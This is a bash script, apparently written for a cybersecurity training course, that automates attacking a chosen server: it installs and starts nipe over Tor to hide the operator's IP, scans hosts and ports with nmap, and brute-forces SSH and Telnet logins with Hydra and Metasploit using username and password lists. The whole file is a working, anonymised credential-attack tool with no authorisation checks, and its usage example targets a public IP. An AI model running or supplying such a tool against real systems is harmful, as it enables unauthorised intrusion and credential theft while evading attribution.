#!/bin/bash

#Date 		: 10/06/2024
#How To     : Run SOC.sh in your terminal with a target IP address, e.g sudo ./SOC.sh 8.8.8.8
#Objective  : Create automation to scan and attack a server on SSH and Telnet.
#Written by : Renald Taurusdi / S18 / CFC01102023-2
#Trainer    : Ryan Tan

## VARIABLES
## =========
## LIST OF REQUIRED PACKAGES
## These are list of packages that needed by the script to be able to run properly
## The script will check through each packages in the variable, and if there's missing pakcages, the script will install automatically
listpkg="
geoip-bin
tor
nipe
"
port_ssh="22"
port_telnet="23"

## Local user variables store current username, current user home directory, and current working directory from which the script is running
current_user=$(logname)
current_homedir="/home/$current_user"
current_workdir=$(pwd)

## Target network IP address based on user input
targetnet=$1

## User and Password list for brute force
userfile="$current_workdir/SOC_user.lst"
passfile="$current_workdir/SOC_pass.lst"

## LOG FILE
## soc_atk.log has information of the scanned target data and the files location in local machine
userlog=$(touch /var/log/soc_target.log | readlink -f /var/log/soc_target.log)

## FUNCTIONS
## =========

## Function to check if nipe is installed in the localhost
function check_nipe_installed()
{
	## Get current username and setting file path for nipe.pl
	current_user=$(logname)
	nipe_file="/home/$current_user/nipe/nipe.pl"
	
	## Check if nipe.pl exist in the specified path
	if [ -f "$nipe_file" ]
	then
		## If installed, print out confirmation
		echo "[o] nipe is already installed."
	else
		## If not installed, it will call the function install_nipe for nipe installation
		echo "[x] nipe is not installed. Installing nipe."
		install_nipe
	fi
}

## Function to install nipe
function install_nipe()
{
	## Set to current home directory
	cd $current_homedir
	
	## Git clone nipe installation folder and set current directory to ./nipe
	git clone https://github.com/htrgouvea/nipe && cd "/home/$current_user/nipe"
	
	## Install dependencies scripts for nipe to run
	## -q will run silent output and <<< yes will automatically provide yes to continue running the installation
	cpanm -q --installdeps .
	cpan install Switch JSON LWP::UserAgent Config::Simple <<< yes
	
	## Install perl nipe.pl
	perl nipe.pl install
	echo "[o] nipe is installed."
	
	## Log package check
	echo "$(date) Package check. Installed missing packages: nipe" >> $userlog
}

## Function to run nipe
function run_nipe()
{
	## Set current directory to ./nipe
	cd "/home/$current_user/nipe"
	
	## Stop nipe service and start it again to clear any buggy connection
	perl nipe.pl stop
	perl nipe.pl start
	
	## Get nipe service status if it's running or not. Awk command will get the nipe running status True or False
	nipe_status=$(perl nipe.pl status | grep -i status | awk '{print $NF}')
	
	## Due to nipe known buggy connection error, it will fail to connect and the status will return empty
	## The code block below will only run if nipe_status variable is not empty to avoid messy error output
	if [ -n "$nipe_status" ]
	then
		## Get nipe spoofed ip address with grep and awk text manipulation
		nipe_ip=$(perl nipe.pl status | grep -i ip | awk '{print $NF}')
		
		## Get nipe spoofed country with geoiplookup and awk text manipulation
		## Sed will remove extra white space at the start of the line for cleaner output
		nipe_country=$(geoiplookup $nipe_ip | awk -F, '{print $NF}' | sed 's/^\ *//')
	fi
	
	## Check if nipe status is running and connection is anonymous
	if [ -n "$nipe_status" ] && [ "$nipe_status" = "true" ]
	then
		## If nipe_status is not empty and its value equal true, connection is anonymous and script can proceed running
		## Print out information of ip address and country for user
		echo ""
		echo "[*] You are now anonymous."
		echo "[*] Your spoofed IP address is $nipe_ip"
		echo "[*] Your spoofed country is $nipe_country"
		
		## Log spoofed ip address information to nr-user.log
		echo "$(date) Running on spoofed IP: $nipe_ip" >> $userlog	
	else
		## If nipe_status is empty or its value equal false, connection is not anonymous and script will exit
		## Due to nipe known buggy connection error, it might be worth to try rerunning the script again before further debugging
		echo ""
		echo "[x] You are not anonymous. Please try to rerun the script."
		echo "[x] Exiting..."
		
		## Log exit with fail reason
		echo "$(date) EXIT. Reason: FAIL not anonymous" >> $userlog
		
		## Exit the script immediately
		exit
	fi
}


## MAIN SECTION
## ============

## Log start of the script
echo "$(date) START. Checking all required packages." >> $userlog

## CHECK REQUIRED PACKAGES
echo "======================================================================="
echo "[*] Checking if required packages are installed..."
## Loop through each package in the listpkg variable to check if it's already installed or not
for eachpkg in $listpkg
do
	## Since nipe requires special installation, when checking for nipe, it will call function check_nipe_installed instead
	if [ "$eachpkg" = "nipe" ]
	then
		## Call function check_nipe_installed to check for nipe
		check_nipe_installed
	else
		## For other packages, the script is using apt-cache policy to check if it's installed or not.
		## If it's not installed, it will show (none) instead of installed version number.
		pkg_ok=$(apt-cache policy $eachpkg | grep none)
		
		## Check if variable pkg_ok is empty or not
		if [ "" = "$pkg_ok" ]
		then
			## If the variable returns empty, that means there's no word none in the output and package is already installed with version number
			echo "[o] $eachpkg is already installed."
		else
			## Otherwise variable will return with none, which means the package are not installed yet
			echo "[x] $eachpkg is not installed. Installing $eachpkg."
			
			## Use apt-get with -qq for silent output and -y for yes confirmation and install the missing package
			apt-get -qq -y install $eachpkg
			echo "[o] $eachpkg is installed."
			
			## Log package check
			echo "$(date) Package check. Installed missing packages: $eachpkg" >> $userlog
		fi
	fi
done

## Log package check
echo "$(date) Package tor and nipe checked. OK all installed" >> $userlog
echo "======================================================================="

## RUN NIPE
## Call function run_nipe to start anonymous connection
echo "[&] Starting nipe..."
run_nipe

## Log target address
echo ""
echo "[*] Target IP address to scan: $targetnet"
echo "$(date) Target IP address to scan: $targetnet" >> $userlog

## By default, it will target one specific IP. If you need to scan network IP, add argument after the IP address
## Example command: sudo ./SOC.sh 8.8.8.8 host
discovery=$2
if [ "" = "$discovery" ]
then
	target_ip=$1
else
	## Scan provided network IP address with Nmap -sn host discovery
	echo ""
	echo "[*] Scan results, target IP address in the network $targetnet: "
	host_scan=$(nmap -sn --unprivileged -n $1/24 -oG - | awk '/Up$/{print $2}')
	host_list=$(echo $host_scan | tr '\n' ' ' )
	echo "$(date) Scanned network with host discovery, list of online IP addresses: $host_list" >> $userlog

	## List found IP addresses on the network address
	for eachip in $host_scan
	do
		echo "[>] $eachip"
	done
	echo ""
	echo -n "[?] Specify a target IP address from scan result: "
	read target_ip
fi

echo "$(date) Target IP address to scan: $target_ip" >> $userlog

## Show list of attack method: Nmap, Hydra, Metasploit
while true
do
	echo ""
	echo "======================================================================="
	echo "[*] Specify attack method: "
	echo "[>] A. Nmap -- Scan with verbose and default NSE script for top 100 ports"
	echo "[>] B. Hydra -- Brute force either SSH or Telnet for its credentials"
	echo "[>] C. Metasploit -- Brute force either SSH or Telnet for its credentials"
	echo "[>] Z. Exit the program"
	echo "======================================================================="
	echo -n "[?] Choose A, B, or C. Choose Z to exit...  : "
	read option
	
	case $option in
		## Nmap run with verbose and default script, output to log
		A)
			echo ""
			echo "===== NMAP ============================================================"
			echo "======================================================================="
			echo "[>] Nmap scan $target_ip as: nmap -sV -sC --version-light --unprivileged -p1-100 $target_ip"
			echo "$(date) Nmap scan $target_ip start" >> $userlog
			nmap -sV -sC --version-light --unprivileged -p1-100 $target_ip -oN - | tee -a $userlog
			
		;;
		## Hydra run with user and password file
		B)
			echo ""
			echo "===== HYDRA ==========================================================="
			echo "======================================================================="
			echo "[>] Hydra scan $target_ip as: hydra -L $userfile -P $passfile $target_ip"
			## Port options
			while true
			do
				echo ""
				echo "[*] Choose $target_ip port to be Hydra scanned: "
				echo "[>] A. SSH port $port_ssh"
				echo "[>] B. Telnet port $port_telnet"
				echo "[>] Z. Back to main menu"
				echo ""
				echo -n "[?] Choose A or B. Choose Z to go back to main menu... : "
				read port_input
				echo ""
				case $port_input in
				## Hydra brute force on SSH
				A)
					echo "[>] Hydra on SSH port 22"
					## Check if SSH port is open
					port_check=$(nc -vnz $target_ip $port_ssh 2>&1 | grep open)
					if [ "" = "$port_check" ]
					then
						echo "[x] Port $port_ssh is not available."
						echo "$(date) Port $port_ssh $target_ip is not available" >> $userlog
						break
					fi
					echo "$(date) Hydra SSH scan $target_ip $port_ssh start" >> $userlog
					## Run Hydra
					timeout 180s hydra -L $userfile -P $passfile $target_ip ssh -I -o $userlog
				;;
				## Hydra brute force on Telnet
				B)
					echo "[>] Hydra scan on Telnet port $port_telnet"
					## Check if Telnet port is open
					port_check=$(nc -vnz $target_ip $port_telnet 2>&1 | grep open)
					if [ "" = "$port_check" ]
					then
						echo "[x] Port $port_telnet is not available."
						echo "$(date) Port $port_telnet $target_ip is not available" >> $userlog
						break
					fi
					echo "$(date) Hydra Telnet scan $target_ip $port_telnet start" >> $userlog
					## Run Hydra
					timeout 180s hydra -L $userfile -P $passfile $target_ip telnet -I -o $userlog
				;;
				## Back to previous menu
				Z)
					break
				;;
				esac
			done
		;;
		## Metasploit brute force scan
		C)
			echo ""
			echo "====== METASPLOIT ====================================================="
			echo "======================================================================="
			echo "[>] Metasploit Brute Force on $target_ip"
			## Port options
			while true
			do
				echo ""
				echo "[*] Choose $target_ip port to be Metasploit scanned: "
				echo "[>] A. SSH port $port_ssh"
				echo "[>] B. Telnet port $port_telnet"
				echo "[>] Z. Back to main menu"
				echo ""
				echo -n "[?] Choose A or B. Choose Z to go back to main menu... : "
				read port_input
				echo ""
				case $port_input in
				## Metasploit brute force on SSH
				A)
					echo "[>] Metasploit scan on SSH port $port_ssh"
					## Check if SSH port is open
					port_check=$(nc -vnz $target_ip $port_ssh 2>&1 | grep open)
					if [ "" = "$port_check" ]
					then
						echo "[x] Port $port_ssh is not available."
						echo "$(date) Port $port_ssh $target_ip is not available" >> $userlog
						break
					fi
					echo "[>] Running msfconsole scanner/ssh/ssh_login..."
					echo "$(date) Metasploit SSH scan $target_ip $port_ssh start" >> $userlog
					echo "$(date) Metasploit is running scanner/ssh/ssh_login" >> $userlog
					## Run Metasploit
					timeout 180s msfconsole -x "spool $userlog; use scanner/ssh/ssh_login; set rhosts $target_ip; set user_file $userfile; set pass_file $passfile; exploit; sessions -K; spool off; exit -y"
				## Metasploit brute force on Telnet
				;;
				B)
					echo "[>] Metasploit scan on Telnet port $port_telnet"
					## Check if Telnet port is open
					port_check=$(nc -vnz $target_ip $port_telnet 2>&1 | grep open)
					if [ "" = "$port_check" ]
					then
						echo "[x] Port $port_telnet is not available."
						echo "$(date) Port $port_telnet $target_ip is not available" >> $userlog
						break
					fi
					echo "[>] Running msfconsole scanner/telnet/telnet_login..."
					echo "$(date) Metasploit Telnet scan $target_ip $port_telnet start" >> $userlog
					echo "$(date) Metasploit is running scanner/telnet/telnet_login" >> $userlog
					## Run Metasploit
					timeout 180s msfconsole -x "spool $userlog; use scanner/telnet/telnet_login; set rhosts $target_ip; set user_file $userfile; set pass_file $passfile; exploit; sessions -K; spool off; exit -y"
				;;
				## Back to previous menu
				Z)
					break
				;;
				esac
			done
		## Exit menu and continue with the rest of the code
		;;
		Z)
			break
		;;
		esac
done

## Print out end of script and log location
echo ""
echo "======================================================================="
echo "[@] Exiting... Please find log at $userlog"
echo "======================================================================="

## Log end of the script to log
echo "$(date) EXIT. Reason: OK success" >> $userlog
